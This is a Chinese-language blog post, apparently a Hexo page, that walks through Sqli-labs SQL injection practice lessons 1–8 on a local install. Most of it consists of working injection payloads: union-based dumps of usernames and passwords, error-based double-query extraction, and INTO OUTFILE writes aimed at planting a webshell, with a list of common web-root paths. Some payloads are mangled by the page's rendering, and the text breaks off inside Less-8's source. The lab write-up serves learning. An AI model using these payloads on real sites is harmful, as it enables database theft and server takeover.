@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>Sqli-labs-GET Part 1-10 | DD&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"DDstick","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/dd.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DD</h5>
+          <a href="mailto:674135019@qq.com" title="674135019@qq.com" class="mail">
+            
+              <span>6</span>
+            
+              <span>7</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>3</span>
+            
+              <span>5</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DDstick" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/custom"  >
+                <i class="icon icon-lg icon-plus-square"></i>
+                CUSTOM
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Sqli-labs-GET Part 1-10</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Sqli-labs-GET Part 1-10</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-08-10T00:30:14.000Z" itemprop="datePublished" class="page-time">
+  2019-08-10
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-Sqli-labs-GET Part 1-10"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Sqli-labs-GET Part 1-10</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-08-10 08:30:14" datetime="2019-08-10T00:30:14.000Z"  itemprop="datePublished">2019-08-10</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><a href="#Sqli-labs注入练习" title="Sqli-labs注入练习"></a>Sqli-labs注入练习</p>
+<p>SQL Injection：是Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
+<p>sqli-labs是一个非常好的学习sql注入的一个游戏教程，对于了解sqlmap的原理很有帮助。</p>
+<p>项目地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><a href="#安装" title="安装"></a>安装</h2><p>首先安装phpstudy或者xampp</p>
+<p>将下载的文件解压发在：phpstudy的WWW文件夹里 或者 xampp里面的htdocs文件夹里面</p>
+<p><strong>修改mysql文件的账号密码：</strong></p>
+<p>在sqli-labs-master\sql-connections里面有个db-creds.inc文件，打开并修改账号密码</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.1.jpg"></a>
+
+<p><strong>进入页面进行安装</strong></p>
+<p>打开网页输入：localhost/sqli-labs-master</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.2.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.2.jpg"></a>
+
+<p>点击第一个：Setup/reset Database for labs 出现下面页面为正确</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.3.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.3.jpg"></a>
+
+<p>返回</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.4.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/0.4.jpg"></a>
+
+<p>完成</p>
+<h1 id="Less-1：基于错误的-get-单引号-字符型注入"><a href="#Less-1：基于错误的-get-单引号-字符型注入" class="headerlink" title="Less-1：基于错误的_get_单引号_字符型注入"></a><a href="#Less-1：基于错误的-get-单引号-字符型注入" title="Less-1：基于错误的_get_单引号_字符型注入"></a>Less-1：基于错误的_get_单引号_字符型注入</h1><a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.1.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.1.png"></a>
+
+<p>Please input the ID as parameter with numeric value //“请输入ID为数值的参数”</p>
+<p>所以我们在url后输入：?id=1，回车，得到下面的页面：</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.2.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.2.png"></a>
+
+<p>输一个id值，返回了name和password，接着测试是否能注入，url后加上?id=1’，发现报错了，直接报的数据库的错，对web浏览器用户透明，那么可以从报错中得到很多信息，比如这是个MySQL的数据库，还可以猜想到后台的sql语句，应该是</p>
+<p>1  </p>
+<p>“SELECT * FROM table_name WHERE id=’$_get[‘id’]‘ LIMIT 0,1”  </p>
+<p>这种，说明他没有过滤单引号，并且id是char型的输入，之所以报错是因为用了单引号，导致后面的部分“’LIMT 0,1;”多余出来了</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.3.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.3.png"></a>
+
+<p>于是构造sql语句-1‘OR’1’=’1’–+屏蔽掉后面的，也可以用#屏蔽，但这里#没有被url编码，故需自己将他转成url编码%23<br>1’=’1’为万能密码之一</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.4.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.4.png"></a>
+
+<p>注入成功~接着来猜字段<strong>1’ order by 3</strong>，有3个字段存在<br><strong>1’ order by 3：</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.5.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.5.png"></a>
+
+<p>再试试4个,没有第4个字段了，即没有第4列<br><strong>1’ order by 4：</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.6.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.6.png"></a>
+
+<p>接着用union 语句爆字段，但始终只显示一条记录，看了下源码，发现他并没有将结果循环输出，而是只返回符合查询结果的第一条记录</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.7.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.7.jpg"></a>
+
+<p>于是利用联合查询的特点，使原查询左边为空，那么我们定义的查询结果便可以返回出来<br><strong>-1’ union select 1,2,3%23</strong><br>之所以改为id=-1而不是继续id=1,是因为id=1或者其他正整数的时候,会有规定的数据取出,查看了dalao的WP发现这是因为在index.php中并没有循环取出数据,因此只要把1改为0或者负数即可</p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.8.png" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.8.png"></a>
+
+<p>于是我们可以通过这里使用数据库的函数来爆出数据库的信息，构造如下语句<br><strong>-1’ union select 1,2,concat_ws(char(32,44,32),user(),database());%23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.9.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.9.jpg"></a>
+
+<p>这里用到的数据库函数有cancat_ws()，char()，user()，database()，cancat_ws()是连接函数，第一个参数是分隔符，同样作用的函数还有cancat()，不同的是cancat()有不同的连接符，char()函数是将十进制参数转换成对应的acsii码，user()和database()都是内置的函数，分别返回用户名和数据库名，类似的函数还有version()，返回数据库的版本信息，但是没有直接返回表名的函数，所以需要通过其他方式获取表名</p>
+<p>这里有一个很经典的方法，我们可以通过系统数据库information_schema来获取表名，information_schema数据库中含有很重要的三张表：SCHEMATA，TABLES和COLUMNS<br>SCHEMATA表中存储了MySQL中所有数据库的信息，包括数据库名，编码类型路径等，show databases的结果取之此表</p>
+<p>TABLES表中存储了MySQL中所有数据库的表的信息（当然，索引是根据数据库名的），包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等，show tables from schemaname的结果取之此表</p>
+<p>COLUMNS表中存储了MySQL中所有表的字段信息，show columns from schemaname.tablename的结果取之此表</p>
+<p>于是，我们可以构造<strong>?id=-1’ union select 1,2,table_name from information_schema where table_schema=’security’%23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.10.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.10.jpg"></a>
+
+<p>这样就爆出了第一张表名，但要获取所有表名还需要用到’limit’，limit是用来指定范围，他有两个参数（limit a，b）a是从第几行开始取，b是取多少行，但需要注意的是实际取出来的开始行下标比a大1，即limit 5,10是表示取6到15行数据，接下来我们就可以用它取指定范围的表了<br><strong>-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 3,1–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.11.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.11.jpg"></a>
+
+<p>这里取的是第4张表，如果超出能取的范围，他会报错<br><strong>-1’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 4,1–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.12.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.12.jpg"></a>
+
+<p>于是通过修改limit的范围我们获取到了所有的表名，且与数据库中的表名一致，其中users表用来存储用户信息的可能性最大，于是，我们可以用同样的方法爆他的字段名<br><strong>-1’ union select 1,2,column_name from information_schema.colums where table_schema=’security’ and table_name=’users’ limit 0,1%23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.13.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.13.jpg"></a>
+
+<p>获取到的字段名有三个id，username，password，于是我们就可以构造语句了<br><strong>-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 0,1 %23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.14.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.14.jpg"></a>
+
+<p>同样的，改变limit的范围以获取所有用户信息<br><strong>-1’ union select 1,2,concat_ws(char(32,44,32),id,username,password) from users limit 1,1 %23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.15.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.15.jpg"></a>
+
+<p>还有一种方法是通过group分组代替limit将所有信息列出来，查找表名可以构造如下payload：<br><strong>-1’ union select 1,2,gruop_concat(char(32),table_name,char(32)) from information_schema.tables where talbe_schema=’security’–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.16.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.16.jpg"></a>
+
+<p>查找字段也是同样<br><strong>-1’ union select 1,2,gruop_concat(char(32),column_name,char(32)) from information_schema.columns where talbe_schema=’security’ and table_name=’users’–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.17.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.17.jpg"></a>
+
+<p>最后的payload可以合并不同的列，上下对应输出<br><strong>-1’ union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.18.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/1.18.jpg"></a>
+
+<h1 id="Less-2：基于错误的-get-整型注入"><a href="#Less-2：基于错误的-get-整型注入" class="headerlink" title="Less-2：基于错误的_get_整型注入"></a><a href="#Less-2：基于错误的-get-整型注入" title="Less-2：基于错误的_get_整型注入"></a>Less-2：基于错误的_get_整型注入</h1><p>开头跟les1一样<br>尝试单引号：<strong>?id=’</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.1.jpg"></a>
+
+<p>这里的报错与less-1不同了，从报错可以看出，此处的id是当做数值来处理的，因为sql语句对于数字型的数据可以不加单引号，而less-1是作为字符串来处理的，猜想后台sql语句应该是select * from table_name where id = $_get[‘id’] limit 0,1于是构造-1 or 1=1<br><strong>?id=-1 or 1=1%23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.2.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.2.jpg"></a>
+
+<p>可以注入，接着用和之前相同的方法先报数据库名，然后是表名，接着是字段，最后的payload如下<br><strong>?id=-1 union select 1,group_concat(char(32),username,char(32)),group_concat(char(32),password,char(32)) from users–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.3.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/2.3.jpg"></a>
+
+<h1 id="Less-3：基于报错的-get-单引号-变形-字符型注入"><a href="#Less-3：基于报错的-get-单引号-变形-字符型注入" class="headerlink" title="Less-3：基于报错的_get_单引号_变形_字符型注入"></a><a href="#Less-3：基于报错的-get-单引号-变形-字符型注入" title="Less-3：基于报错的_get_单引号_变形_字符型注入"></a>Less-3：基于报错的_get_单引号_变形_字符型注入</h1><p><strong>?id=’</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/3.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/3.1.jpg"></a>
+
+<p>查看源代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=('<span class="variable">$id</span>') LIMIT 0,1"</span>;  </span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);  </span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+
+<p>看报错，所谓变形就是用)代替了空格，猜想后台sql是select * from table_name where id =(‘$_get[‘id’]’)limit 0,1于是构造-1’)or’1’=’1’–+<br><strong>?id=-1’)or’1’=’1’–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/3.2.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/3.2.jpg"></a>
+
+<p>最后的payload:<br><strong>?id=-1’) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 1,1%23</strong></p>
+<h1 id="Less-4：基于错误的-get-双引号-字符型注入"><a href="#Less-4：基于错误的-get-双引号-字符型注入" class="headerlink" title="Less-4：基于错误的_get_双引号_字符型注入"></a><a href="#Less-4：基于错误的-get-双引号-字符型注入" title="Less-4：基于错误的_get_双引号_字符型注入"></a>Less-4：基于错误的_get_双引号_字符型注入</h1><p><strong>?id=-1’</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.1.jpg"></a>
+
+<p>尝试单引号正常无报错信息，因为在php中双引号可以包含单引号，输入单引号后台就变成了id=(“$_GET[‘id’]’”)</p>
+
+<p>于是尝试双引号，查看报错信息，猜想后台sql语句为select * from table_name where id =(“$_get[‘id’]”)limit 0,1；构造如下sql注入：<br><strong>?id=-1”)or 1=1–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.3.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.3.jpg"></a>
+
+<p>payload:<br><strong>?id=-1”) union select 1,username,concat_ws(char(32,44,32),id,database(),password) from users limit 0,1%23</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.4.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/4.4.jpg"></a>
+
+<h1 id="less-5：双注入-get-单引号-字符型注入"><a href="#less-5：双注入-get-单引号-字符型注入" class="headerlink" title="less-5：双注入_get_单引号_字符型注入"></a><a href="#less-5：双注入-get-单引号-字符型注入" title="less-5：双注入_get_单引号_字符型注入"></a>less-5：双注入_get_单引号_字符型注入</h1><p>当输入?id=1时页面显示正常<br><strong>?id=1</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.1.jpg"></a>
+
+<p>什么都没有，然后注意到提示是“双注入”，于是百度了一下，总结如下：</p>
+<h2 id="双注入查询"><a href="#双注入查询" class="headerlink" title="双注入查询"></a><a href="#双注入查询" title="双注入查询"></a>双注入查询</h2><p>双查询注入顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rand()随机函数，返回0~1之间的某个值  </span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数  </span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数  </span><br><span class="line">group by cluase分组语句，按照cluase对查询结果分组</span><br></pre></td></tr></table></figure>
+
+<p>双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式，于是payload构造如下：<br><strong>?id=-1’ union select count(_),2,concat(‘_‘,(select database()),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.2.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.2.jpg"></a>
+
+<p>获取到数据库名后再用同样的方法获取表名<br><strong>?id=-1’ union select count(_),2,concat(‘_‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.3.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.3.jpg"></a>
+
+<p>然后是用户信息，这里只能查询一行，所以不能用group_concat，可以修改limit的范围来遍历用户信息<br><strong>?id=-1’ union select count(_),2,concat(‘_‘,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.4.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/5.4.jpg"></a>
+
+<h1 id="Less-6：双注入-get-双引号-字符型注入"><a href="#Less-6：双注入-get-双引号-字符型注入" class="headerlink" title="Less-6：双注入_get_双引号_字符型注入"></a><a href="#Less-6：双注入-get-双引号-字符型注入" title="Less-6：双注入_get_双引号_字符型注入"></a>Less-6：双注入_get_双引号_字符型注入</h1><p>换汤不换药，按照Less-5的方法，只是把单引号改成了双引号，直接上payload:<br><strong>?id=-1” union select count(_),2,concat(‘_‘,(select concat_ws(char(44),id,username,password) from users limit 1,1),’_‘,floor(rand()_2)) as a from information_schema.tables group by a–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/6.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/6.1.jpg"></a>
+
+<h1 id="Less-7：导出文件-get-字符型注入"><a href="#Less-7：导出文件-get-字符型注入" class="headerlink" title="Less-7：导出文件_get_字符型注入"></a><a href="#Less-7：导出文件-get-字符型注入" title="Less-7：导出文件_get_字符型注入"></a>Less-7：导出文件_get_字符型注入</h1><a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/7.1.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/7.1.jpg"></a>
+
+<p>尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是：</p>
+<p>1  </p>
+<p>select A into outfile B  </p>
+<p>这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，于是这里就有两种思路：</p>
+<h2 id="第一种，将小马写入文件中，用菜刀拿下："><a href="#第一种，将小马写入文件中，用菜刀拿下：" class="headerlink" title="第一种，将小马写入文件中，用菜刀拿下："></a><a href="#第一种，将小马写入文件中，用菜刀拿下：" title="第一种，将小马写入文件中，用菜刀拿下："></a>第一种，将小马写入文件中，用菜刀拿下：</h2><p>所以大概要使用文件导出。Mysql数据库需要在指定的目录下进行数据的导出，secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户具有FILE权限。<br>如果这个参数为空，这个变量没有效果；<br>如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>如果这个参数为NULL，MySQL服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。<br><strong>show variables like ‘%secure%’;</strong></p>
+
+
+<p><strong>?id=-1’)) union select 1,2,’‘ into outfile “/var/lib/mysql-files/DD.php”–+</strong></p>
+<a rel=Sqli-labs-GET Part 1-10 href="/2019/08/10/Sqli-labs-GET%20Part%201-10/7.3.jpg" title="" data-fancybox="images"><img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/7.3.jpg"></a>
+
+
+
+<p>但看了其他daloa的wp，都涉及到路径的转义<br>dalao都是在Win下操作的，所以需要，而Linux和Win不同，所有此处不太一样</p>
+<h2 id="第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”"><a href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”" class="headerlink" title="第一种，构造select * from users into outfile “数据库导入导出数据的目录”"></a><a href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”" title="第一种，构造select * from users into outfile “数据库导入导出数据的目录”"></a>第一种，构造select * from users into outfile “数据库导入导出数据的目录”</h2><p><strong>?id=-1’)) union select group_concat(username),’<em>‘,group_concat(password) from users into outfile “/var/lib/mysql-files/DD.txt”–+</em></strong></p>
+<p><strong>小扩展：</strong><br>winserver的iis默认路径c:\Inetpub\wwwroot</p>
+<p>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p>
+<p>apache 就…/var/www/htm，…/var/www/html/htdocs</p>
+<p>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW\</p>
+<p>xammp 就是…\xampp\htdocs</p>
+<p><strong>导入导出数据还会涉及到哪些函数：</strong></p>
+<p>@@datadir：数据库存储路径</p>
+<p>@@basedir：MySQL安装路径</p>
+<p>dumpfile：导出文件，类似outfile，不同的是，dumpfile一次导出一行，会和limit结合使用</p>
+<p>load_file()：将文件导入mysql，用法 select load_file(“文件路径”);</p>
+<h1 id="Less-8：bool型-单引号-盲注"><a href="#Less-8：bool型-单引号-盲注" class="headerlink" title="Less-8：bool型_单引号_盲注"></a><a href="#Less-8：bool型-单引号-盲注" title="Less-8：bool型_单引号_盲注"></a>Less-8：bool型_单引号_盲注</h1><h2 id="Less-8源码"><a href="#Less-8源码" class="headerlink" title="Less-8源码:"></a><a href="#Less-8源码" title="Less-8源码:"></a>Less-8源码:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//including the 